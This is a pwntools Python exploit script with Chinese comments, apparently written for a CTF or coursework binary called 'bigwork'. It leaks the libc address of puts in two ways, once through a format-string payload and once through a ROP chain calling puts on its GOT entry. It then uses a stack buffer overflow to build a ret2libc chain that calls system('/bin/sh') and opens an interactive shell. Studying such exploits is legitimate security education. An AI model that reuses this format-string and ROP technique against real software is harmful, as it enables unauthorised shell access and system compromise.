from pwn import *
# context.log_level = 'debug'

sh = process('../src/bigwork')
elf = ELF('../src/bigwork')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = 0x401329
pop_rdi_ret = 0x0401453

# 泄露方法 1
sh.sendline('2'.encode())
sh.recv()
pyload = 'aaaa%7$s'.encode() + p64(puts_got) 
sh.sendline(pyload)
puts_real = u64(sh.recv()[10: 16] + '\x00\x00'.encode())  
print(hex(puts_real))

# 泄露方法 2
sh.sendline('1'.encode())
sh.recv()
pyload1 = ('a' * 0x30 + 'b' * 0x08).encode()
pyload1 += p64(pop_rdi_ret)  # 跳转地址
pyload1 += p64(puts_got)     # 参数
pyload1 += p64(puts_plt)     # 跳转函数
pyload1 += p64(main_addr)    # 返回地址
sh.sendline(pyload1)
puts_real = u64(sh.recv()[0x40: 0x46] + '\x00\x00'.encode())
print(hex(puts_real))

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc_base = puts_real - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + libc.search('/bin/sh'.encode()).__next__()


sh.sendline('1'.encode())
pyload2 = ('a' * 0x30 + 'b' * 0x08).encode()
pyload2 += p64(0x40101a) 
pyload2 += p64(pop_rdi_ret)  # 跳转地址
pyload2 += p64(bin_sh_addr)  # 参数
pyload2 += p64(system_addr)  # 跳转函数
pyload2 += p64(main_addr)    # 返回地址
sh.sendline(pyload2)

sh.interactive()
